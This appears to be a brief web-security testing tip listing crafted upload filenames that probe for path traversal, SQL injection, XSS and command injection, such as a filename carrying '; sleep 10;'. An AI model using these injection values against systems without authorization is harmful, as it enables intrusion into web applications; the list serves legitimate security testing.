# FileUploads

Chaining file uploads with other vulns
When testing file upload functionalities in a web application, try setting the filename to the following values:

```
- ../../../tmp/lol.png —> for path traversal
- sleep(10)-- -.jpg —> for SQL injection
- <svg onload=alert(document.domain)>.jpg/png —> for XSS
- ; sleep 10; —> for command injections
```
